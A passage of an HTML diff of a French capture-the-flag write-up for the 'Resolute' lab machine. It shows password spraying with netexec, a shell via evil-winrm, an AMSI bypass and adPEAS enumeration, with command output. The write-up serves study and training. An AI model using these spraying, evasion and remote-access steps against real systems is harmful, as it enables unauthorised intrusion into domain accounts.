+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:RESOLUTE<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:megabank.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\m</span>arko:Welcome123!<span class="w"> </span>STATUS_LOGON_FAILURE
+</span></code></pre></div>
 <p>Et... le pass ne fonctionne pas. Comme il est dit que c'est le password utilisé à la création d'un compte, je tente donc un password-spraying sur ma liste d'utilisateur:</p>
-<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ netexec smb 10.129.167.19 -u users.txt -p 'Welcome123!'
-SMB         10.129.167.19   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
-SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE
-SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE
-SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE
-SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE
-SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE
-SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE
-SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE
-SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE
-SMB         10.129.167.19   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
-SMB         10.129.167.19   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>pak@DESKTOP-AF1CU53:~/tmp$<span class="w"> </span>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome123!&#39;</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:RESOLUTE<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:megabank.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\s</span>teve:Welcome123!<span class="w"> </span>STATUS_LOGON_FAILURE
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\f</span>red:Welcome123!<span class="w"> </span>STATUS_LOGON_FAILURE
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\m</span>arcus:Welcome123!<span class="w"> </span>STATUS_LOGON_FAILURE
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\s</span>imon:Welcome123!<span class="w"> </span>STATUS_LOGON_FAILURE
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\r</span>yan:Welcome123!<span class="w"> </span>STATUS_LOGON_FAILURE
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\s</span>tevie:Welcome123!<span class="w"> </span>STATUS_LOGON_FAILURE
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\a</span>ngela:Welcome123!<span class="w"> </span>STATUS_LOGON_FAILURE
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\c</span>laire:Welcome123!<span class="w"> </span>STATUS_LOGON_FAILURE
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\c</span>laude:Welcome123!<span class="w"> </span>STATUS_LOGON_FAILURE
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>SMB<span class="w">         </span><span class="m">10</span>.129.167.19<span class="w">   </span><span class="m">445</span><span class="w">    </span>RESOLUTE<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>megabank.local<span class="se">\m</span>elanie:Welcome123!
+</span></code></pre></div>
 <p>Et là on a un truc. Et même une connexion via WinRM :</p>
-<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ evil-winrm -i 10.129.167.19 -u melanie -p 'Welcome123!'
-
-Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\melanie\Documents&gt;
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>pak@DESKTOP-AF1CU53:~/tmp$<span class="w"> </span>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.129.167.19<span class="w"> </span>-u<span class="w"> </span>melanie<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome123!&#39;</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Evil-WinRM<span class="w"> </span>shell<span class="w"> </span>v3.5
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>Warning:<span class="w"> </span>Remote<span class="w"> </span>path<span class="w"> </span>completions<span class="w"> </span>is<span class="w"> </span>disabled<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>ruby<span class="w"> </span>limitation:<span class="w"> </span>quoting_detection_proc<span class="o">()</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>is<span class="w"> </span>unimplemented<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>machine
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>Data:<span class="w"> </span>For<span class="w"> </span>more<span class="w"> </span>information,<span class="w"> </span>check<span class="w"> </span>Evil-WinRM<span class="w"> </span>GitHub:<span class="w"> </span>https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>Info:<span class="w"> </span>Establishing<span class="w"> </span>connection<span class="w"> </span>to<span class="w"> </span>remote<span class="w"> </span>endpoint
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt;
+</span></code></pre></div>
 <p>L'utilisateur ne semble pas avoir de droits particuliers :</p>
-<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; whoami /all
-
-USER INFORMATION
-----------------
-
-User Name        SID
-================ ===============================================
-megabank\melanie S-1-5-21-1392959593-3013219662-3596683436-10101
-
-
-GROUP INFORMATION
------------------
-
-Group Name                                 Type             SID          Attributes
-========================================== ================ ============ ==================================================
-Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
-
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                    State
-============================= ============================== =======
-SeMachineAccountPrivilege     Add workstations to domain     Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
-
-USER CLAIMS INFORMATION
------------------------
-
-User claims unknown.
-
-Kerberos support for Dynamic Access Control on this device has been disabled.
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">melanie</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">USER</span> <span class="n">INFORMATION</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="p">----------------</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">User</span> <span class="n">Name</span>        <span class="n">SID</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="p">================</span> <span class="p">===============================================</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="n">megabank</span><span class="p">\</span><span class="n">melanie</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1392959593</span><span class="p">-</span><span class="n">3013219662</span><span class="p">-</span><span class="n">3596683436</span><span class="p">-</span><span class="n">10101</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="nb">GROUP </span><span class="n">INFORMATION</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="p">-----------------</span>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="nb">Group </span><span class="n">Name</span>                                 <span class="nb">Type </span>            <span class="n">SID</span>          <span class="n">Attributes</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="p">==========================================</span> <span class="p">================</span> <span class="p">============</span> <span class="p">==================================================</span>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="n">Everyone</span>                                   <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">0</span>      <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span>            <span class="k">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">580</span> <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span>                              <span class="k">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">545</span> <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Pre-Windows</span> <span class="n">2000</span> <span class="n">Compatible</span> <span class="n">Access</span> <span class="k">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">554</span> <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NETWORK</span>                       <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">2</span>      <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>           <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">11</span>     <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">This</span> <span class="n">Organization</span>             <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">15</span>     <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NTLM</span> <span class="n">Authentication</span>           <span class="n">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">64</span><span class="p">-</span><span class="n">10</span>  <span class="k">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group</span>
+</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a><span class="k">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">Medium</span> <span class="k">Mandatory</span> <span class="n">Level</span>     <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">16</span><span class="p">-</span><span class="n">8192</span>
+</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a>
+</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a>
+</span><span id="__span-7-27"><a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a><span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
+</span><span id="__span-7-28"><a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a><span class="p">----------------------</span>
+</span><span id="__span-7-29"><a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a>
+</span><span id="__span-7-30"><a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a><span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>
+</span><span id="__span-7-31"><a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a><span class="p">=============================</span> <span class="p">==============================</span> <span class="p">=======</span>
+</span><span id="__span-7-32"><a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a><span class="n">SeMachineAccountPrivilege</span>     <span class="n">Add</span> <span class="n">workstations</span> <span class="n">to</span> <span class="n">domain</span>     <span class="n">Enabled</span>
+</span><span id="__span-7-33"><a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a><span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span>
+</span><span id="__span-7-34"><a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a><span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="k">process</span> <span class="n">working</span> <span class="nb">set </span><span class="n">Enabled</span>
+</span><span id="__span-7-35"><a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a>
+</span><span id="__span-7-36"><a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a>
+</span><span id="__span-7-37"><a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a><span class="n">USER</span> <span class="n">CLAIMS</span> <span class="n">INFORMATION</span>
+</span><span id="__span-7-38"><a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a><span class="p">-----------------------</span>
+</span><span id="__span-7-39"><a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a>
+</span><span id="__span-7-40"><a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a><span class="n">User</span> <span class="n">claims</span> <span class="n">unknown</span><span class="p">.</span>
+</span><span id="__span-7-41"><a id="__codelineno-7-41" name="__codelineno-7-41" href="#__codelineno-7-41"></a>
+</span><span id="__span-7-42"><a id="__codelineno-7-42" name="__codelineno-7-42" href="#__codelineno-7-42"></a><span class="n">Kerberos</span> <span class="n">support</span> <span class="k">for</span> <span class="n">Dynamic</span> <span class="n">Access</span> <span class="n">Control</span> <span class="n">on</span> <span class="n">this</span> <span class="n">device</span> <span class="n">has</span> <span class="n">been</span> <span class="n">disabled</span><span class="p">.</span>
+</span></code></pre></div>
 <p>Winpeas n'a rien donné de particulier, on lance alors adpeas qui servira ensuite à alimenter notre bloodhound :</p>
-<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; Bypass-4MSI
-
-Info: Patching 4MSI, please be patient...
-
-[+] Success!
-*Evil-WinRM* PS C:\Users\melanie\Documents&gt; dir
-
-
-    Directory: C:\Users\melanie\Documents
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----        3/18/2024   4:34 PM        3119779 adPEAS.ps1
--a----        3/18/2024   4:27 PM        2234368 winPEASx64_ofs.exe
-
-
-*Evil-WinRM* PS C:\Users\melanie\Documents&gt; Import-Module .\adPEAS.ps1
-*Evil-WinRM* PS C:\Users\melanie\Documents&gt; Invoke-adpeas
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt;<span class="w"> </span>Bypass-4MSI
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Info:<span class="w"> </span>Patching<span class="w"> </span>4MSI,<span class="w"> </span>please<span class="w"> </span>be<span class="w"> </span>patient...
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Success!
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt;<span class="w"> </span>dir
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">    </span>Directory:<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>-a----<span class="w">        </span><span class="m">3</span>/18/2024<span class="w">   </span><span class="m">4</span>:34<span class="w"> </span>PM<span class="w">        </span><span class="m">3119779</span><span class="w"> </span>adPEAS.ps1
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>-a----<span class="w">        </span><span class="m">3</span>/18/2024<span class="w">   </span><span class="m">4</span>:27<span class="w"> </span>PM<span class="w">        </span><span class="m">2234368</span><span class="w"> </span>winPEASx64_ofs.exe
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt;<span class="w"> </span>Import-Module<span class="w"> </span>.<span class="se">\a</span>dPEAS.ps1
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt;<span class="w"> </span>Invoke-adpeas
+</span></code></pre></div>
 <p>Bloodhound ne donne rien de particulier... Je chercher alors quelques trucs à la main.</p>
-<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; dir -force
-
-    Directory: C:\
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d--hs-        3/18/2024   4:29 PM                $RECYCLE.BIN
-d--hsl        9/25/2019  10:17 AM                Documents and Settings
-d-----        9/25/2019   6:19 AM                PerfLogs
-d-r---        9/25/2019  12:39 PM                Program Files
-d-----       11/20/2016   6:36 PM                Program Files (x86)
-d--h--        9/25/2019  10:48 AM                ProgramData
-d--h--        12/3/2019   6:32 AM                PSTranscripts
-d--hs-        9/25/2019  10:17 AM                Recovery
-d--hs-        9/25/2019   6:25 AM                System Volume Information
-d-r---        12/4/2019   2:46 AM                Users
-d-----        12/4/2019   5:15 AM                Windows
--arhs-       11/20/2016   5:59 PM         389408 bootmgr
